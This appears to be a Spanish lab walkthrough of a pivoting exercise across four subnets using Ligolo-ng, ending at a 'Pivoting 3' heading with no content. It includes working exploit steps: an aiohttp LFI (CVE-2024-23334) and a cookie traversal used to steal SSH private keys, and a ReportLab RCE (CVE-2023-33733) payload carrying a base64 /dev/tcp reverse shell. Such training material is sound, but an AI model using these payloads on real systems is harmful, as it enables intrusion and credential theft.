<img width="882" height="443" alt="image" src="https://github.com/user-attachments/assets/6a9c36f2-2543-4c88-88c4-8b6b4085cd01" />

# 🧠 Laboratorio de Pivoting y Movimiento Lateral

## 🏗️ Arquitectura de Red y Diseño del Escenario

Para dar inicio a este laboratorio, es fundamental comprender la topología de red diseñada. A diferencia de entornos de explotación lineal o de baja dificultad, este escenario presenta una arquitectura segmentada compuesta por **cuatro máquinas interconectadas**, distribuidas a través de **cuatro subredes lógicas distintas**.

![Arquitectura de Red](https://github.com/user-attachments/assets/fcb5e26c-7280-42b5-9099-5256ff562224)

---

## 🔀 Segmentación y Conectividad (Dual-Homed)

La característica crítica de esta infraestructura es que cada nodo intermedio está configurado como una máquina **dual-homed**.

Esto implica que cada activo posee al menos **dos interfaces de red** (físicas o virtuales) activas, permitiéndole:

- Coexistir en múltiples segmentos de red simultáneamente  
- Actuar como puente entre subredes  
- Facilitar el movimiento lateral  

💡 Esta configuración es el pilar del laboratorio, ya que estas máquinas funcionan como **gateways naturales** entre zonas que normalmente estarían completamente aisladas.

---

## 🗺️ Referencia Visual de la Infraestructura

Para facilitar el seguimiento de la intrusión y mantener una trazabilidad clara del progreso, se ha definido un esquema donde se detallan:

- Direccionamientos IP  
- Nombres de host  
- Relación entre segmentos de red  

Este esquema servirá como **hoja de ruta** a lo largo de toda la guía.

---

## 🎯 Objetivos Estratégicos y Metodología

El propósito central de este laboratorio es el perfeccionamiento de técnicas de **Pivoting**.

El ejercicio demanda que el operador sea capaz de:

- Tunelizar tráfico desde una red externa  
- Acceder a segmentos internos progresivamente  
- Utilizar cada máquina comprometida como un **jump server**  

---

## 🔄 Flujo del Compromiso

El éxito del ejercicio se define por la capacidad de comprometer todos los activos de forma escalonada:


RED 1 → RED 2 → RED 3 → RED 4


Cada sistema comprometido permite:

- Expandir el acceso dentro de la red  
- Establecer nuevos túneles  
- Alcanzar segmentos previamente inaccesibles  

---

## 🔐 Nota sobre la Escalada de Privilegios

Durante la fase de post-explotación en cada nodo, se realizaron auditorías exhaustivas mediante:

- Scripts de enumeración automatizada  
- Búsqueda de capabilities  
- Identificación de binarios SUID  
- Análisis de vulnerabilidades del kernel  

### 📌 Resultados

- ❌ No se identificaron vectores de escalada de privilegios críticos o intencionados  
- 🎯 El entorno está enfocado en el **movimiento lateral**  

---

## 🧩 Diseño del Reto

El laboratorio está optimizado específicamente para la práctica de:

- Pivoting  
- Enrutamiento interno  
- Gestión de túneles y proxies  

### 🔧 Herramientas recomendadas

- Chisel  
- Ligolo-ng  
- Metasploit (autoroute)  

---

## ✍️ Nota de Edición

Con el fin de mantener la guía concisa y enfocada en el aprendizaje del pivoting:

> Se han omitido los procesos de enumeración negativa relacionados con la escalada de privilegios.

Tras obtener acceso inicial en cada máquina, se procede directamente al:

- Establecimiento de túneles  
- Movimiento lateral hacia el siguiente objetivo  


# Reconocimiento inicial (máquina “Hospital”, 10.10.10.2)

Se inicia el reconocimiento mediante un ping a la máquina. Esto se hace por un lado para detectar que la máquina se encuentra accesible y por otro lado para poder detectar el sistema operativo mediante el TTL asignado.

```
ping -c 1 10.10.10.2
```

<img width="542" height="140" alt="image" src="https://github.com/user-attachments/assets/cef1e452-c001-44f3-9c47-70597eebf88b" />

Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux.

Una vez hecho esto, se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP SYN.

```ruby
sudo nmap -sS -p- --min-rate 1000 -n -Pn 10.10.10.2 -oN allPorts
```
<img width="520" height="280" alt="image" src="https://github.com/user-attachments/assets/beb731d2-1508-49f1-af4b-d1b5651a5092" />

En la segunda, se realiza un reconocimiento básico de los servicios subyacentes también mediante el uso de nmap. Esta vez, realizando dicha tarea de reconocimiento únicamente en los puertos detectados como abiertos.

```ruby
nmap -sCV -p 22,80,5000 -n -Pn 10.10.10.2 -oN services
```

<img width="826" height="341" alt="image" src="https://github.com/user-attachments/assets/42bff05a-f0cc-4e6d-b7ee-9c281ff39d4e" />

En este caso, se omite el escaneo de puertos UDP, ya que para esta máquina en particular no tiene ningún servicio relevante para llevar a cabo el ejercicio.

## 🚪 Acceso Inicial — drzunder (Máquina "Hospital" | 10.10.10.2)

### 🔍 Enumeración de Servicios

Durante la fase de reconocimiento inicial, se identificaron los siguientes puertos abiertos en el objetivo:

- **22/tcp** → Servicio SSH (*OpenSSH*)  
- **80/tcp** → Servicio HTTP (*Apache*)  
- **5000/tcp** → Servicio HTTP (*aiohttp 3.9.1*)  

Adicionalmente, mediante fingerprinting de servicios, se determinó que el sistema operativo subyacente es **Ubuntu**.

---

### ⚠️ Identificación de Vulnerabilidad

Tras analizar los servicios expuestos, se detectó que la aplicación web ejecutándose en el puerto **5000** es vulnerable a una **lectura arbitraria de archivos (LFI)**, correspondiente a la siguiente vulnerabilidad:

- **CVE-2024-23334**

Esta vulnerabilidad permite a un atacante acceder a archivos locales del sistema sin necesidad de autenticación, lo que resulta crítico en escenarios de post-explotación y recolección de credenciales.

---

### 🧨 Explotación

Se identificó un **Proof of Concept (PoC)** funcional disponible públicamente, el cual permite explotar la vulnerabilidad de forma directa:

- 🔗 CVE: https://nvd.nist.gov/vuln/detail/CVE-2024-23334  
- 🔗 Exploit: https://github.com/s4botai/CVE-2024-23334-PoC  

Una vez descargado el exploit, se procedió a su ejecución para validar la vulnerabilidad mediante la lectura del archivo `/etc/passwd`.

### 🧨 Exfiltración de la clave privada

```bash
wget https://raw.githubusercontent.com/s4botai/CVE-2024-23334-PoC/refs/heads/main/lfi.sh
chmod +x lfi.sh
./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /etc/passwdS
``` id="exploit-lfi"
````

<img width="964" height="507" alt="image" src="https://github.com/user-attachments/assets/b8bbcbd4-ba1b-415f-9feb-67f3f9c4ace6" />


La explotación fue exitosa, permitiendo la lectura de archivos locales del sistema objetivo. Esto confirma:

- La existencia de la vulnerabilidad LFI  
- La capacidad de acceder a información sensible  
- Un punto de apoyo inicial para continuar con la intrusión  

Este vector será clave para la obtención de credenciales y el posterior acceso al sistema a través de otros servicios como SSH.


### 🛠️ Preparación de la clave

Una vez obtenida, se guarda localmente y se ajustan los permisos requeridos por SSH:

```bash
nano drzunder-id_rsa
chmod 600 drzunder-id_rsa
``` id="prep-ssh"
```
### 🚪 Acceso remoto vía SSH

Se establece conexión con el sistema objetivo utilizando autenticación por clave:

```bash
ssh -i drzunder-id_rsa drzunder@10.10.10.2
```
Una vez dentro, se verifica el contexto de ejecución:

![Acceso SSH exitoso](https://github.com/user-attachments/assets/b6f1ac35-d7d2-4243-b1b5-dba87a78720f)


### 📌 Conclusión

La explotación de la vulnerabilidad permitió:

- Acceder a archivos sensibles del sistema  
- Exfiltrar la clave privada del usuario  
- Autenticarse vía SSH sin credenciales tradicionales  
- Obtener acceso interactivo al sistema  

Este punto representa un **acceso inicial completo**, habilitando fases posteriores como enumeración interna y técnicas de pivoting.

## 🔀 Pivoting 1 (10.10.10.0/24 → 20.20.20.0/24)

### 🧭 Identificación de doble interfaz (Dual-Homed)

En esta fase se detecta que la máquina comprometida **"Hospital"** pertenece a **dos segmentos de red distintos**, lo que la convierte en un candidato ideal para realizar pivoting.

La validación se realiza mediante la inspección del archivo `/etc/hosts`, donde se observa que el hostname está asociado a múltiples direcciones IP:

```bash
cat /etc/hosts
```
![Interfaces de red](https://github.com/user-attachments/assets/779ba088-88f5-42e1-a769-647dc194c184)

Este comportamiento confirma que el sistema actúa como un nodo **dual-homed**, es decir, con conectividad simultánea a:

- `10.10.10.0/24` (red inicial comprometida)  
- `20.20.20.0/24` (red interna no accesible directamente)  

---

### 🎯 Objetivo del Pivoting

Dado que ya se ha comprometido esta máquina, puede utilizarse como **primer pivote** para:

- Enumerar la red interna (`20.20.20.0/24`)  
- Descubrir nuevos activos  
- Establecer rutas de acceso hacia sistemas inaccesibles desde el exterior  

Este paso marca el inicio del **movimiento lateral real dentro del laboratorio**.

---

## ⚙️ Herramienta utilizada: Ligolo-ng

Para esta fase se utiliza **Ligolo-ng**, una herramienta moderna y eficiente para tunneling y pivoting.

🔗 Repositorio: https://github.com/Nicocha30/ligolo-ng  
🔗 Releases: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2  

---

### 🚀 Características clave

- Uso de interfaz **TUN** para redirección de tráfico  
- Soporte de **tráfico IP completo** (no solo puertos)  
- Compatible con herramientas nativas como:
  - `nmap`
  - `netexec`
  - `curl`, etc.  
- No requiere privilegios elevados en el host pivote  
- Conexión reversa mediante **TLS** (evasión de restricciones)  
- Simula acceso como si se estuviera dentro de la red interna  

💡 Esto permite trabajar de forma transparente, sin necesidad de configuraciones complejas adicionales.

---

## 🧩 Arquitectura de Ligolo-ng

Ligolo-ng se compone de dos elementos principales:

### 🖥️ Proxy (Atacante)

Se ejecuta en la máquina del operador y actúa como:

- Centro de control de túneles  
- Receptor de conexiones de agentes  
- Gestor de sesiones y rutas  

Permite:

- Listar sesiones activas  
- Configurar túneles  
- Redirigir tráfico  

---

### 🛰️ Agente (Víctima / Pivote)

Se ejecuta en la máquina comprometida (**Hospital**) y:

- Establece conexión reversa TLS hacia el proxy  
- Expone su red interna  
- Permite pivotar hacia otros segmentos  

---

## ▶️ Inicialización del Proxy

Una vez descargados los binarios correspondientes, se inicia el **proxy** en la máquina atacante.

> ⚠️ Se recomienda ejecutar este proceso en una terminal separada y mantenerla activa durante toda la operación.

```ruby
sudo ./proxy -selfcert
NFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                               
        /____/                          /____/                                                                                                
                                                                                                                                              
  Made in France ♥            by @Nicocha30!                                                                                                  
  Version: 0.8.3                                                                          

- El proxy quedará a la escucha en el puerto **11601** por defecto  
- Se utiliza un certificado autofirmado para la conexión TLS  
```

A## 🔗 Despliegue del Agente y Establecimiento del Túnel

Una vez inicializado el **proxy**, el siguiente paso consiste en conectar la máquina comprometida (**Hospital**) mediante el agente de Ligolo-ng.

Para ello, es necesario transferir el binario del agente al sistema objetivo, asignarle permisos de ejecución y establecer una conexión reversa hacia el proxy.

---

### 📦 Transferencia del agente

Desde la máquina atacante, se levanta un servidor HTTP temporal para facilitar la transferencia del binario:

```bash
python3 -m http.server 80
``` id="http-server"
```
---

### 📥 Descarga y preparación en la máquina pivote

En la máquina comprometida:

```bash
cd /tmp
wget http://10.10.10.1/agent
ls -al agent
chmod +x agent
``` id="agent-setup"
```

### 🚀 Ejecución del agente

Se ejecuta el agente indicando la dirección del proxy y deshabilitando la verificación del certificado:

```bash
./agent -connect 10.10.10.1:11601 -ignore-cert
``` id="agent-run"
```
![Ejecución del agente]<img width="1127" height="29" alt="image" src="https://github.com/user-attachments/assets/9d90e7ea-dbcd-4b71-b1d3-79541c0f2160" />




### 📡 Verificación de la conexión

Tras la ejecución, el agente establece una conexión reversa hacia el proxy. Desde la consola del proxy, se puede confirmar que la sesión ha sido registrada correctamente:

```bash
ligolo-ng » INFO[...] Agent joined. id=02420a0a0a02 name=drzunder@489a833a8b7e remote="10.10.10.2:53694"
``` id="agent-check"
```
<img width="1127" height="29" alt="image" src="https://github.com/user-attachments/assets/10e90139-3317-4a3c-8acf-c4da2dc41c88" />


### 📌 Resultado

En este punto:

- ✅ El agente se encuentra activo en la máquina pivote  
- ✅ El proxy ha registrado la sesión correctamente  
- ✅ Se ha establecido un canal de comunicación seguro (TLS)  

---

### 🧠 Conclusión

La conexión del agente marca un punto clave en el proceso de pivoting:

- Se habilita el acceso a la red interna desde la máquina atacante  
- Se establece la base para el enrutamiento de tráfico  
- Se permite interactuar con la red `20.20.20.0/24` como si se estuviera dentro de ella  

El siguiente paso consistirá en configurar la interfaz TUN y comenzar la enumeración de la red interna.

(en el proxy)
session (seleccionar la 1, la única que hay)
```
ifconfig
```
<img width="674" height="499" alt="image" src="https://github.com/user-attachments/assets/70de067b-7386-4dcf-adba-7e0bc93ec3bb" />

Una vez conocida la dirección CIDR de la nueva red, es necesario crear una nueva interfaz TUN en la máquina de trabajo para poder redirigir el tráfico de red a esta.
````
sudo ip tuntap add user root mode tun ligolo (crear la interfaz TUN llamada "ligolo")
sudo ip link set ligolo up (levanta la interfaz de red creada)
ip link show ligolo (comprobar el estado de la interfaz)
````
<img width="419" height="51" alt="image" src="https://github.com/user-attachments/assets/d83b0ecc-1607-4692-8ccc-c3ddf38b07ad" />

El siguiente paso consiste en actualizar la tabla de enrutamiento para que el tráfico de la nueva red se enrute a través de la interfaz “ligolo”.

sudo ip route add 20.20.20.0/24 dev ligolo (asociar la dirección CIDR de la nueva red a la interfaz "ligolo" en la tabla de enrutamiento)
ip route list (listar la tabla de enrutamiento actualizada)

Una vez hecho esto, desde el proxy se da la instrucción para, usando la sesión activa, iniciar el túnel de red a través de la interfaz “ligolo”. Esto se hace para permitir enrutar tráfico hacia la red del agente.

```
(en el proxy, con la sesión previamente seleccionada)
start
```
<img width="528" height="36" alt="image" src="https://github.com/user-attachments/assets/dc85f659-12e9-4556-922f-9328fbe82263" />

Al realizar esta operación, quedaría comprobar si la siguiente máquina perteneciente a la nueva red es accesible. Para ello, se realiza un ping y se comprueba su TTL, tal y como se ha hecho con la anterior.
```
ping 20.20.20.3 -c 1
```
<img width="492" height="137" alt="image" src="https://github.com/user-attachments/assets/b0b1a0e9-3e16-4536-8042-43a84e41f4fc" />

Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux. Por lo que, es posible continuar de forma normal con el siguiente reconocimiento inicial.


## 🔍 Reconocimiento inicial — Máquina "Patient" (20.20.20.3)

Una vez establecido el pivoting hacia la red interna (`20.20.20.0/24`), se procede al reconocimiento del nuevo objetivo: **Patient (20.20.20.3)**.

El análisis se realiza en dos fases: descubrimiento de puertos y enumeración de servicios.

---

### 📡 Fase 1: Escaneo de puertos (TCP Connect)

En primer lugar, se realiza un escaneo completo de puertos TCP para identificar servicios accesibles:

```bash
sudo nmap -sT -p- -n -Pn 20.20.20.3
``` id="tcp-connect-scan"
```
![Escaneo de puertos](https://github.com/user-attachments/assets/1eff2f3f-c13d-4dce-b5c2-8ef0dc2b93aa)

### ⚙️ Justificación del uso de TCP Connect

En este escenario se utiliza el modo **TCP Connect (`-sT`)** en lugar del escaneo SYN (`-sS`) debido a las limitaciones impuestas por el entorno de pivoting con **Ligolo-ng**.

El escaneo SYN requiere acceso a **raw sockets**, lo cual no está disponible cuando el tráfico está encapsulado dentro de un túnel TCP.

Por el contrario, el método TCP Connect:

- Establece una conexión TCP completa mediante `connect()`  
- No requiere raw sockets  
- Es compatible con entornos tunelizados  
- Ofrece mayor fiabilidad en este contexto  

💡 Aunque es menos sigiloso y más lento que SYN scan, resulta más adecuado en escenarios donde el tráfico está encapsulado.

### 🔎 Fase 2: Enumeración de servicios

Una vez identificados los puertos abiertos, se procede a la enumeración detallada de servicios y versiones:

```bash
nmap -sCV -p 2222,9000 -n -Pn 20.20.20.3 -oN services-20.20.20.3
``` id="service-scan"
```
Este escaneo permite:

- Identificar versiones de servicios  
- Ejecutar scripts básicos de detección (`-sC`)  
- Obtener información relevante para futuras fases de explotación  

---

### 🚫 Consideraciones sobre UDP

En este caso, no se realiza escaneo de puertos UDP debido a que:

- No se han identificado servicios relevantes expuestos en UDP  
- El alcance del laboratorio se centra en servicios TCP  
- UDP suele requerir tiempos de escaneo mayores sin impacto significativo en este contexto  

---

### 📌 Conclusión

El reconocimiento inicial sobre la máquina **Patient** revela:

- Puertos TCP abiertos en `2222` y `9000`  
- Servicios activos que serán analizados en fases posteriores  
- Un punto de entrada potencial dentro de la red interna  

Este análisis sienta las bases para la siguiente fase: **enumeración profunda y posible explotación de servicios**.


## 🚪 Acceso inicial — Aplicación web (Patient | 20.20.20.3)

### 🔍 Enumeración de servicios

En la máquina **Patient (20.20.20.3)** se identifican los siguientes servicios expuestos:

- **2222/tcp** → SSH (OpenSSH)  
- **9000/tcp** → HTTP (Werkzeug / Python)  

Adicionalmente, mediante fingerprinting, se determina que el sistema operativo subyacente es **Ubuntu**.


### 🌐 Análisis de la aplicación web

Al acceder al servicio HTTP en el puerto 9000:

``
http://20.20.20.3:9000
``

se identifica una funcionalidad de **subida de archivos**.

![Aplicación web](https://github.com/user-attachments/assets/d2e04787-36e2-45ee-9697-e3bf8d35631b)

### 🔎 Análisis del código fuente

Al revisar el código fuente de la página:


view-source:http://20.20.20.3:9000/


se observa que la aplicación restringe los archivos permitidos al formato **.html**.

![Código fuente](https://github.com/user-attachments/assets/dfb318e9-2b58-4f0d-91bc-6aea55f5a2a1)


### 📄 Prueba de funcionalidad

Se crea un archivo HTML simple para validar el comportamiento de la aplicación:

```html
<strong>hola</strong>
``` id="test-html"

Tras subir el archivo, el sistema procesa automáticamente el contenido y genera un archivo PDF como salida.

![Conversión a PDF](https://github.com/user-attachments/assets/5696625d-12e8-4939-b58e-8b93f1c84f40)

---
```
### 🧾 Análisis del PDF generado

Al inspeccionar los metadatos del archivo PDF generado:

![Metadatos PDF](https://github.com/user-attachments/assets/8bf4f298-b524-4ebe-881b-44afe4fe4608)

Aunque no se especifica la versión, la investigación revela que esta librería es vulnerable a ejecución remota de código.

### ⚠️ Identificación de vulnerabilidad

Se determina que la aplicación es susceptible a la siguiente vulnerabilidad:

- **CVE-2023-33733** → Remote Code Execution en ReportLab PDF Library  

Referencia:
https://nvd.nist.gov/vuln/detail/CVE-2023-33733  

Exploit:
https://github.com/c53elyas/CVE-2023-33733  

---

## 🔗 Preparación del entorno de pivoting (Ligolo-ng)

Antes de ejecutar el exploit, es necesario configurar el proxy de Ligolo-ng para permitir la comunicación de retorno (reverse shell) a través del túnel.

Se configuran redirecciones de puertos en el proxy:

```bash
listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp
listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp
listener_list
``` id="ligolo-listeners"

- **Puerto 1337** → Reverse shell  
- **Puerto 8008** → Transferencia de archivos futura  
```
![Listeners configurados](https://github.com/user-attachments/assets/435a514f-cc4f-48a1-a22c-afa270ac9f06)



## 🐚 Preparación del listener

Se levanta un listener en la máquina atacante para recibir la reverse shell a través del túnel:

```bash
rlwrap nc -nvlp 1337
``` id="listener-rev"
```
<img width="301" height="67" alt="image" src="https://github.com/user-attachments/assets/a2db1361-a262-41d2-89dc-8e8f5b16f004" />

Para evitar problemas con la codificación de caracteres, se codifica la carga útil en Base64.

```
(apuntando a la interfaz interna del agente, la única accesible por la máquina objetivo)
echo "sh -i >& /dev/tcp/20.20.20.2/1337 0>&1" | base64
```
<img width="513" height="59" alt="image" src="https://github.com/user-attachments/assets/b476a0a5-25b1-4073-9ceb-f7c3dc47e7ae" />

Una vez descargado el exploit, no se debe instalar ninguna dependencia ni tampoco ejecutarse este. Además, se debe sustituir la instrucción por defecto “touch /tmp/exploited” por una instrucción que descodifique y ejecute la carga útil previamente obtenida.


```ruby
echo <TU CARGA ÚTIL EN BASE64 AQUÍ> | base64 -d | bash
```
<img width="1435" height="162" alt="image" src="https://github.com/user-attachments/assets/d8e30511-e5fe-4ff9-a30a-740d91dc4331" />

Se debe copiar el contenido HTML encontrado dentro de la instrucción “add_paragraph” al final del PoC en un nuevo archivo HTML. En este caso se le asigna el nombre de “exploit.html”.
```ruby
# exploit.html

            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('echo <AQUÍ VA TU CARGA ÚTIL EN BASE64> | base64 -d | bash') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>
```
<img width="1266" height="170" alt="image" src="https://github.com/user-attachments/assets/d4a7a3dd-6f93-4d59-a427-f14f572019ee" />


Al subir este archivo a través del formulario, se obtiene automáticamente acceso al sistema en el puerto a la escucha establecido previamente en la máquina de trabajo.
```
whoamiS
id
hostname
```
<img width="481" height="153" alt="image" src="https://github.com/user-attachments/assets/5a4333a8-41af-45fe-bedb-d2cbb486d997" />

A continuación se actualiza la consola actual a una interactiva usando Python.

```ruby
tty (not a tty)
python3 --version (instalado)
python3 -c 'import pty;pty.spawn("/bin/bash")'
tty (/dev/pts/0)
```
<img width="435" height="143" alt="image" src="https://github.com/user-attachments/assets/7a458ae1-88c9-4589-aa4f-7385bfc9ac2b" />

Además, se encuentra una clave privada para acceso mediante SSH en el directorio personal del usuario “app”, la cual servirá para asegurar la persistencia en el sistema.
```ruby
cd ~/.ssh
ls -al
cat id_rsa
```
Se obtiene la clave privada y se prueba a acceder a través de SSH al sistema.
```ruby
mousepad app-id_rsa
chmod 600 app-id_rsa
ssh -i app-id_rsa app@20.20.20.3 -p 2222
yes <aceptar la firma sin verificar la autenticidad>
whoami
id
hostname
```
<img width="571" height="225" alt="image" src="https://github.com/user-attachments/assets/be1687cf-b661-4f01-a5b4-a410fe2bde57" />

# Pivoting 2 (20.20.20.0/24 -> 30.30.30.0/24)

En este punto, se detecta que esta máquina pertenece a dos redes diferentes. Se comprueba en este caso a través del archivo “/etc/hosts” (no se ha encontrado otra forma de comprobarlo en este caso) que el nombre de la máquina “Patient” está asociada a dos direcciones IP de dos redes diferentes.
```
cat /etc/hosts
```
<img width="391" height="153" alt="image" src="https://github.com/user-attachments/assets/99621287-dd5d-462f-ac9d-13eaa71a60ce" />

Al haber comprometido esta máquina, es posible utilizarla como “pivote” para poder detectar nuevos sistemas en la otra red a la que pertenece (en este caso, para acceder a la siguiente máquina del ejercicio). Por ello, vamos a hacer que la máquina “Patient” sea el segundo “pivote” de este ejercicio.

Para que el agente de este nuevo “pivote” pueda detectar el servicio que expone el proxy y conectarse a él, es necesario configurar una nueva redirección para el puerto 11601 (el servicio a la escucha del proxy de Ligolo-NG) usando la sesión activa del primer “pivote”. De esta forma, el nuevo agente podrá conectarse al proxy a través de la redirección establecida por el primer “pivote”, siguiendo la misma lógica que con la consola inversa establecida en la sección anterior.
```
(desde el proxy, seleccionando el único agente que hay conectado)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp (proxy puerto 11601 <-> agente puerto 11601)
listener_list
```

<img width="739" height="131" alt="image" src="https://github.com/user-attachments/assets/961f3c07-5a37-446b-a412-8540688fdb1f" />

A continuación se conectará la máquina “pivote” al proxy mediante el agente descargado. Para ello, se transfiere el agente a la máquina, se le asignan permisos de ejecución y se le indica que se conecte al servicio del proxy que se encuentra a la escucha. En este caso, apuntando a la dirección IP del primer “pivote”, ya que es el encargado de redirigir el puerto y hacerlo visible para el segundo.

(nueva consola en máquina de trabajo)
python3 -m http.server 8008 (levantar un servidor HTTP en el directorio donde se encuentra el binario del agente descargado, usando el puerto 8008 para hacer visibles los recursos, ya que ya se está redirigiendo a través del primer "pivote")
```
(en la segunda máquina "pivote")
cd /tmp
wget http://20.20.20.2:8008/agent (descargar el agente en la segunda máquina "pivote")
ls -al agent
chmod +x agent
./agent -connect 20.20.20.2:11601 -ignore-cert (inidicar al agente que se conecte al proxy, apuntando al puerto redirigido a través de la primera máquina "pivote")
```
<img width="989" height="190" alt="image" src="https://github.com/user-attachments/assets/17bb1ec5-0597-4e2e-be75-c3eaba8d21d2" />


El agente indica que se ha establecido una conexión. Al volver al proxy, se puede comprobar que este la ha recibido correctamente.
```
[Agent : drzunder@489a833a8b7e] » INFO[5049] Agent joined.    id=024214141403 name=app@db5ee3b6cabc remote="127.0.0.1:39760"
```
<img width="1266" height="23" alt="image" src="https://github.com/user-attachments/assets/87bdf432-df51-44ff-8839-5e3ec2915b56" />

El siguiente paso consiste en seleccionar la sesión recientemente iniciada y comprobar las interfaces de red de la máquina “pivote”.
```
(en el proxy)
session (seleccionar la 2)
ifconfig
```
<img width="450" height="456" alt="image" src="https://github.com/user-attachments/assets/308ab32f-283f-4614-b24b-298c25064a40" />

Una vez conocida la dirección CIDR de la nueva red, es necesario crear una nueva interfaz TUN en la máquina de trabajo para poder redirigir el tráfico de red a esta.


```ruby
sudo ip tuntap add user root mode tun ligolo2 (crear la interfaz TUN llamada "ligolo2")
sudo ip link set ligolo2 up (levanta la interfaz de red creada)
ip link show ligolo2 (comprobar el estado de la interfaz)
```

El siguiente paso consiste en actualizar la tabla de enrutamiento para que el tráfico de la nueva red se enrute a través de la interfaz “ligolo2”.
```
sudo ip route add 30.30.30.0/24 dev ligolo2 (asociar la dirección CIDR de la nueva red a la interfaz "ligolo2" en la tabla de enrutamiento)
ip route list (listar la tabla de enrutamiento actualizada)
````
Una vez hecho esto, desde el proxy se da la instrucción para, usando la sesión activa, iniciar el túnel de red a través de la interfaz “ligolo2”. Esto se hace para permitir enrutar tráfico hacia la red del agente.
````
(en el proxy, con la sesión previamente seleccionada)
start --tun ligolo2 (es necesario especificar la interfaz, sino seleccionará la primera por defecto y dará error, porque ya está en uso)
````
<img width="541" height="31" alt="image" src="https://github.com/user-attachments/assets/b93cbbd5-d362-4783-9a37-cec782c60e20" />

Al realizar esta operación, quedaría comprobar si la siguiente máquina perteneciente a la nueva red es accesible. Para ello, se realiza un ping y se comprueba su TTL, tal y como se ha hecho con la anterior.
```ruby
ping 30.30.30.3 -c 1
```
<img width="522" height="133" alt="image" src="https://github.com/user-attachments/assets/14662efb-0f42-4854-9a9a-17055e37c32a" />

Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux. Por lo que, es posible continuar de forma normal con el siguiente reconocimiento inicial.

# 🔍 Reconocimiento inicial — Máquina "Node" (30.30.30.3)

## 📡 Fase 1: Escaneo de puertos

Se realiza un escaneo completo de puertos TCP con el objetivo de identificar servicios expuestos en la máquina objetivo.

Debido al contexto de pivoting (tráfico encapsulado a través de túneles), se utiliza un escaneo **TCP Connect (`-sT`)**, ya que:

- No requiere raw sockets  
- Es compatible con entornos tunelizados  
- Resulta más fiable en este escenario que TCP SYN  

```bash id="scan-full-ports"
sudo nmap -sT -p- -n -Pn 30.30.30.3
```

<img width="561" height="188" alt="image" src="https://github.com/user-attachments/assets/8e1842e2-355b-4dd0-a30f-ca8d31ae631f" />

🔎 Fase 2: Enumeración de servicios

Una vez identificados los puertos abiertos, se procede a enumerar los servicios y versiones asociados:

nmap -sCV -p 2222,3000 -n -Pn 30.30.30.3 -oN services-30.30.30.3

<img width="813" height="283" alt="image" src="https://github.com/user-attachments/assets/3e08672f-2f4b-4335-833f-9e3f3e5763f4" />

🚪 Acceso inicial — Máquina "Node" (30.30.30.3)
🔍 Enumeración de servicios

Se identifican los siguientes servicios:

2222/tcp → SSH (OpenSSH)
3000/tcp → HTTP (Node.js / Express)

El sistema operativo subyacente es Ubuntu.

🌐 Análisis de la aplicación web

Al acceder al servicio HTTP:
```
http://30.30.30.3:3000
``` id="web-node"
```
se observa una página aparentemente vacía.

![Aplicación web](https://github.com/user-attachments/assets/4eee5d8c-92ab-4588-99a5-e0ab3dba42ed)



## 🍪 Análisis de cookies

Durante la inspección de las peticiones, se identifica una cookie denominada:

```
profile=Base64(texto)
```
![Cookie](https://github.com/user-attachments/assets/071fe383-a151-4fe6-9821-87a645ca1cb8)

El valor de la cookie está codificado en Base64 y corresponde a un identificador UUID dinámico.

Ejemplo de decodificación:

```bash id="decode-cookie"
echo 'NTQxNTM0MjQtNThkYS00OTg5LTljODktZjcwYzM1NTM5OGI1' | base64 -d
````
⚠️ Identificación de vulnerabilidad

Tras múltiples pruebas, se detecta que la cookie profile es vulnerable a Directory Traversal, permitiendo acceder a archivos arbitrarios del sistema.

🧪 Prueba de explotación (lectura de archivos)

Se utiliza Burp Suite para interceptar y manipular la petición:

Se codifica en Base64 un payload que apunta a /etc/passwd
Se modifica el valor de la cookie profile con dicho payload
Se envía la petición mediante Repeater

Resultado: acceso exitoso al contenido del archivo /etc/passwd.

👤 Enumeración de usuarios

Del archivo `/etc/passwd` se identifica la existencia del usuario:

node

Siguiendo la misma técnica de Directory Traversal, se intenta acceder a su clave privada SSH ubicada en:
`/home/node/.ssh/id_rsa`

🔑 Extracción de clave privada

Se codifica el path en Base64 y se inyecta nuevamente en la cookie profile.

El resultado confirma la existencia de la clave privada del usuario.

🚪 Acceso mediante SSH

Una vez obtenida la clave privada, se guarda localmente y se ajustan permisos:
```ruby
mousepad node-id_rsa
chmod 600 node-id_rsa
ssh -i node-id_rsa node@30.30.30.3 -p 2222
```
Se acepta la huella del host y se valida el acceso:
```ruby
whoami
id
hostname
```
📌 Conclusión

A través del análisis de la aplicación web se logró:

Identificar una cookie manipulable codificada en Base64

Detectar una vulnerabilidad de Directory Traversal

Leer archivos arbitrarios del sistema

# Pivoting 3 (30.30.30.0/24 -> 40.40.40.0/24)

